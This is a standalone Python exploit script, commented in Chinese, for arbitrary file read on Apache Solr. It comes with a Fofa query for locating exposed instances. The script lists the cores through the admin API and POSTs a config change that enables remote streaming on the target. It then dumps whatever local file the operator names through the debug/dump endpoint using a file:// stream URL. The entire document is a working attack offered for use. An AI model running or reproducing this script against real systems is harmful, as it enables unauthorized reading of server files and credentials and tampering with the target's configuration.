# coding=utf-8
# Apache Solr 全版本任意文件读取
# Fofa：app="Apache-Solr" || app="Solr"

import requests
import json
import sys
import time

def title():
    print("+～～～～～～～～～～～～～～～～～～～～～～～～～～～～～+")
    print("+～～～～～～ Apache Solr 全版本任意文件读取 ～～～～～～+")
    print("+～～～～～～     Use: python3 solr.py     ～～～～～～+")
    print("+～～～～～～   url: http://x.x.x.x:port   ～～～～～～+")
    print("+～～～～～～～～～～～～～～～～～～～～～～～～～～～～～+")
    time.sleep(2)

def get_name(url):
    url_1 = url + "/solr/admin/cores?indexInfo=false&wt=json"
    try:
        res = requests.get(url=url_1)
        #将json数据python字典话
        name = str(list(json.loads(res.text)["status"])[0])
        print("[!]  获取到目标系统name:\033[31m%s\033[0m"%name+"  [0]"+"URL:"+url+"/solr/"+name+"/config")
        return name
    except Exception as e:
        print("[!]  目标URL无法进行利用。",e)
        sys.exit(0)

def check_vul(url,name):
    url_2 = url +"/solr/" + name + "/config"
    data = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'

    try:
        res = requests.post(url=url_2,data=data)
        if "This response format" in res.text and res.status_code == 200:
            print("[!]  \033[31m目标系统存在漏洞\033[0m")
        else:
            print("[!]  目标系统不存在漏洞")
            sys.exit(0)
    except Exception as e:
        print("[!]  目标系统请求失败。")
        sys.exit(0)

def read_files(url,name,file_name):
    url = url + "/solr/" + name + "/debug/dump?param=ContentStreams"
    # 此处必须要加content-type,否则读取不到文件
    headers = {
        "Content-Type" : "application/x-www-form-urlencoded"
    }
    data = "stream.url=file://{}".format(file_name)

    try:
        res = requests.post(url=url,headers=headers,data=data)
        if "No such file or directory" in res.text:
            print("[!] 目标系统读取文件失败！")
            sys.exit(0)
        else:
            print("正在读取文件..........")
            content = (json.loads(res.text)["streams"][0]["stream"])
            print("[o] 读取文件内容为：\n\033[34m{}\033\0m".format(content))
    except Exception as e:
        print("[!]  目标系统似乎意外中断了",e)
        sys.exit(0)

if __name__ == "__main__":
    title()
    url = str(input("\n[!]  请输入目标系统URL: "))
    name = get_name(url)
    check_vul(url,name)
    file_name = str(input("[!]  请输入要读取的文件："))
    read_files(url,name,file_name)


